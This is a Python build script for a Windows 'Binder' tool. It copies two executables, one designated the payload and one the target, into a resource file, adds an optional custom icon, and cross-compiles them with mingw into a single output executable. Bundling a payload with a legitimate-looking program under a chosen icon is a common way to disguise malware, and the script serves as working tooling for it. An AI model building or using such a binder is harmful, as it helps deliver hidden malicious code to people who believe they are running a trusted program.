#!/usr/bin/python

import argparse,sys
import os
import subprocess
import shutil

class Main:

    def __init__(self, quiet = False):

        self.quiet = quiet
        self.output = ""
        self.noicon = False

        self.RESOURCE_FILE_PATH = "res.rc"
        self.RESOURCE_OBJ_PATH = "res.o"
        self.RES_BIN_EXT = ".txt"
        self.BINDER_SRC_PATH = "src/binder.c"
        self.ICON_PATH = "target_icon.ico"
        self.TARGET_BINARY_RES_PATH = "target.txt"
        self.PAYLOAD_BINARY_RES_PATH ="payload.txt"
        self.FLAGS = "-lshlwapi"
        self.OUTPUT_DIR = "output"
        self.MIN_LEN_OF_OUTPUT_MESSAGE = 12

        self.res_content = []

    def execute(self):
        """Here, we parse the commandline options and react according to them"""

        parser = argparse.ArgumentParser(description="A simple wrapper for 'Binder', which will recompile the Binder with two Windows binaries given in arguments")

        parser.add_argument("binary1", help="path to binary1")
        parser.add_argument("binary2", help="path to binary2")

        parser.add_argument("-o", "--output", metavar="OUTPOUT FILENAME", default="output.exe", help="name of output binary", dest="output")
        parser.add_argument("-i", "--icon", metavar="ICON", help="path to desired icon to output binary", dest="icon", default="")

        options = parser.parse_args()

        self.output = self.OUTPUT_DIR + "/" + options.output

        #create output directory if necessary
        if not os.path.exists(self.OUTPUT_DIR):
            os.makedirs(self.OUTPUT_DIR)


        if options.icon == "":
            self.noicon = True

        if self.quiet == False:
            #debug
            print ("[*] Binaire 1 : " + options.binary1)
            print ("[*] Binaire 2 : " + options.binary2)
            print ("[*] Output binary will be : " + options.output)

            if options.icon == "":
                print("[-] No icon")
            else:
                print("[*] Icon : " + options.icon)

        for path in [options.binary1, options.binary2, options.icon]:
            
            if path == options.icon and self.noicon == True:
                continue

            if os.path.exists(path):
                self.copy_binary(path)
            else:
                print("[!] " + path + " not found")
                print("[!] Exiting....")
                return
        
        #let's compile everything
        self.make()

        #delete temp files
        self.cleanup()

    def copy_binary(self, filepath):
        """
        filepath : path to file to copy
        This method makes a copy of the given file in argument. This basically just renames a file, but we dont' want to make changes to anything.
        """

        basename = filepath.split('.')[0]
        ext = filepath.split('.')[1]
        output = ""

        if ext == 'ico':
            output = self.ICON_PATH
        else:
            output = basename + self.RES_BIN_EXT
        
        shutil.copyfile(filepath, output)

    def rsc_content_init(self):
        """Generation of the resources file"""
        
        self.res_content.append("#include <winnt.h>\t\n")
        self.res_content.append('#include "src/includes/resource.h"\t\n')
        self.res_content.append('IDR_PAYLOAD\tRCDATA\t"'+self.PAYLOAD_BINARY_RES_PATH+'"\t\n')
        self.res_content.append('IDR_TARGET\tRCDATA\t"'+self.TARGET_BINARY_RES_PATH+'"\t\n')

        if self.noicon == False:
            self.res_content.append('MAIN_ICON\tICON\t"' + self.ICON_PATH + '"\t\n')
                
    def make_rsc_file(self):
        """Writes the content of self.res_content to disk"""

        self.rsc_content_init()

        with open(self.RESOURCE_FILE_PATH, "w") as f:
            f.writelines(self.res_content)
            
    def make(self):
        """This method takes care of compiling the resources file and the two binded binaries."""
        
        out = ""

        #dumping res.rc to disk [will be compiled as resource file]
        self.make_rsc_file()
        
        res_command = "x86_64-w64-mingw32-windres {resfile} {resobj}".format(resfile=self.RESOURCE_FILE_PATH, resobj=self.RESOURCE_OBJ_PATH)
        build_command = "x86_64-w64-mingw32-gcc {src} -o {output} {objres} {flag}".format(src=self.BINDER_SRC_PATH, output=self.output, objres=self.RESOURCE_OBJ_PATH, flag=self.FLAGS)

        if not self.quiet:
            print("[*] Compiling :")
            print(res_command)  
            print(build_command)

        res_process = subprocess.Popen(res_command.split(), stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        out += "".join(map(str,res_process.communicate()))
        build_process = subprocess.Popen(build_command.split(), stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        out += "".join(map(str,build_process.communicate()))

        #checking the len of out to know it we encoutered errors
        if len(out) > self.MIN_LEN_OF_OUTPUT_MESSAGE:
            print("[!] Errors : " + out)
        else:
            print("[*] Compilation succeeded")


    def cleanup(self):
        """Removes every temporary files created during the compilation"""

        files = [self.TARGET_BINARY_RES_PATH, 
                self.PAYLOAD_BINARY_RES_PATH,
                self.RESOURCE_FILE_PATH,
                self.RESOURCE_OBJ_PATH,
                self.ICON_PATH]

        for item in files:
            if os.path.exists(item):
                os.remove(item)
                print("[*] " + item + " deleted")
            else:
                print("[!] File " + item + " not found while cleanin up. This could be an error.")

if __name__ == "__main__":
    main = Main()
    main.execute()
